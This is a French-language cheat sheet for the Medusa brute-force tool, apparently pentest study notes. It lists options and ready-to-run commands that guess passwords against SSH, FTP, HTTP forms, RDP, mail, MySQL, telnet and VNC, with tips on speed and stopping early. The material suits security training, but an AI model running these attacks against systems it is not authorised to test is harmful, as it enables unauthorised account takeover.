# Medusa Brute-Force Login

## Installation & Lancement

- Vérifier :
  - `medusa -h`
- Installer :
  - `sudo apt-get update`
  - `sudo apt-get install medusa`

## Syntaxe Générale

`medusa [cibles] [credentials] -M module [module_options]`

| Option        | Explication |
|---------------|------------|
| **-h IP**     | Cible unique |
| **-H file**   | Liste de cibles |
| **-u USER**   | Un login |
| **-U file**   | Liste de logins |
| **-p PASS**   | Un password |
| **-P file**   | Liste de passwords |
| **-M MODULE** | Protocole/service à attaquer |
| **-m "..."**  | Options spécifiques module (ex : chemin, méthode POST) |
| **-n PORT**   | Changer le port |
| **-t N**      | Threads (ex: -t 10) |
| **-f / -F**   | Arrêt sur 1 succès (hôte courant / tous) |
| **-v [0-6]**  | Niveau de verbosité |

## Modules à retenir

| Module      | Usage rapide |
|-------------|----------------|
| **ssh**     | `medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh` |
| **ftp**     | `medusa -h 192.168.1.10 -u admin -P pass.txt -M ftp` |
| **http**    | `medusa -h www.site.com -U users.txt -P pass.txt -M http -m GET` |
| **web-form**| `medusa -h www.site.com -U users.txt -P pass.txt -M web-form -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |
| **rdp**     | `medusa -h 192.168.1.100 -u admin -P pass.txt -M rdp` |
| **imap**    | `medusa -h mail.site.com -U users.txt -P pass.txt -M imap` |
| **pop3**    | `medusa -h mail.site.com -U users.txt -P pass.txt -M pop3` |
| **mysql**   | `medusa -h 192.168.1.10 -u root -P pass.txt -M mysql` |
| **telnet**  | `medusa -h 192.168.1.10 -u admin -P pass.txt -M telnet` |
| **vnc**     | `medusa -h 192.168.1.10 -P pass.txt -M vnc` |

## Exemples classiques

### Brute-force SSH

`medusa -h 192.168.0.100 -U users.txt -P pass.txt -M ssh`

### Multi-webservers Basic Auth (GET)

`medusa -H web_servers.txt -U users.txt -P pass.txt -M http -m GET`

### Web Form POST

`medusa -h www.site.com -U users.txt -P pass.txt -M web-form -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`

- Ajoute d’autres paramètres si besoin dans `FORM:...`
- `F=` = string d’échec, comme pour Hydra.

### Test des mots de passe vides ou login=password

`medusa -h 10.0.0.5 -U users.txt -e ns -M ssh`

- **-e n** : teste mot de passe vide
- **-e s** : teste username comme mot de passe

## Astuces Medusa

- **-t 10** : booster la vitesse (attention à ne pas faire crasher la cible).
- **-f / -F** : arrêter dès qu’un login valide trouvé (discret/rapide).
- **-v 4** : debug utile, montre tous les essais.
- **-n PORT** : change de port si service pas standard.
- **-M web-form** : pour cibler les formulaires POST personnalisés.

## Ressources utiles

- [Medusa GitHub](https://github.com/jmk-foofus/medusa)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)

# Medusa Brute-Force sur SSH & FTP

## SSH & FTP : vecteurs classiques

- **SSH** : accès distant sécurisé, mais vulnérable aux mots de passe faibles.
- **FTP** : transfert de fichiers, mots de passe en clair ! Toujours à tester.

## Brute-force SSH avec Medusa

Exemple attaque :

`medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`

- **-h <IP>** : adresse de la cible
- **-n <PORT>** : port SSH (défaut 22)
- **-u sshuser** : utilisateur SSH connu
- **-P wordlist** : liste de mots de passe
- **-M ssh** : module SSH
- **-t 3** : 3 threads (accélère la recherche)

**Résultat** : Medusa affiche le login/password dès qu’il trouve un combo valide.

## Brute-force FTP avec Medusa

Si utilisateur ftpuser trouvé sur la cible :

`medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5`

- **-h 127.0.0.1** : attaque en local (IPv4)
- **-u ftpuser** : utilisateur FTP
- **-M ftp** : module FTP
- **-t 5** : 5 threads (plus rapide)

